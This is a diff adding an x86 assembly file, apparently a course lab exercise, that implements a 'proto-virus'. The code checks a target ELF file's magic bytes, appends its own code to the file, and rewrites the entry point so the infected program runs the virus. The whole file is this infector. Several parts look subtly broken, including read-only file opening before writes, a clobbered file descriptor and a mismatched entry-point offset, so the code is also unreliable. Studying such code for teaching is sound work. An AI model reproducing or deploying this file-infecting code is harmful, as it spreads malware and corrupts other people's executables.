@@ -1,0 +1,100 @@
+
+%macro	syscall1 2
+	mov	ebx, %2
+	mov	eax, %1
+	int	0x80
+%endmacro
+
+%macro	syscall3 4
+	mov	edx, %4
+	mov	ecx, %3
+	mov	ebx, %2
+	mov	eax, %1
+	int	0x80
+%endmacro
+
+%macro  exit 1
+	syscall1 1, %1
+%endmacro
+
+%macro  write 3
+	syscall3 4, %1, %2, %3
+%endmacro
+
+%macro  read 3
+	syscall3 3, %1, %2, %3
+%endmacro
+
+%macro  open 3
+	syscall3 5, %1, %2, %3
+%endmacro
+
+%macro  lseek 3
+	syscall3 19, %1, %2, %3
+%endmacro
+
+%macro  close 1
+	syscall1 6, %1
+%endmacro
+
+%define	STK_RES	200
+%define	RDWR	2
+%define	SEEK_END 2
+%define SEEK_SET 0
+
+%define ENTRY		24
+%define PHDR_start	28
+%define	PHDR_size	32
+%define PHDR_memsize	20	
+%define PHDR_filesize	16
+%define	PHDR_offset	4
+%define	PHDR_vaddr	8
+%define ELFHDR_size 52
+%define ELFHDR_phoff	28
+	
+	global _start
+
+	section .text
+_start:	
+	push	ebp
+	mov	ebp, esp
+	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
+	;CODE START
+	open FileName, 0, 0111 		; open FileName with readonly and 111 permissions  (read)
+	cmp eax, 0
+	jl _print_failure
+	read eax, esp, 4			; read first 4 bytes into esp (reserved place)
+	cmp dword [esp], 0x7f454c46 ;cmp STK_RES to elf magic bytes
+	jne _print_failure
+	;now we should write the code from _start to virus_end
+	call get_my_loc				;now ecx holds location for next_i
+	add ecx, next_i-_start		;add ecx the offset from next_i to _start, now ecx points at _start address
+	lseek eax, 0, SEEK_END		;jump with the ELF file descriptor to it's end
+	write eax, ecx, virus_end-_start
+
+	;now we should override the entry point with our _start address, which is held in ecx
+	lseek eax, 25, SEEK_SET		;move fd pointer to the entry point
+	write eax, ecx, 4			;write new entry point
+	
+	_print_failure:
+		write 1, Failstr, 13 
+
+
+VirusExit:
+       exit 0            ; Termination if all is OK and no previous code to jump to
+                         ; (also an example for use of above macros)
+	
+FileName:	db "ELFexec", 0
+OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
+Failstr:    db "perhaps not", 10 , 0
+	
+
+get_my_loc:
+	call next_i
+next_i:
+	pop ecx
+	ret	
+PreviousEntryPoint: dd VirusExit
+virus_end:
+
+
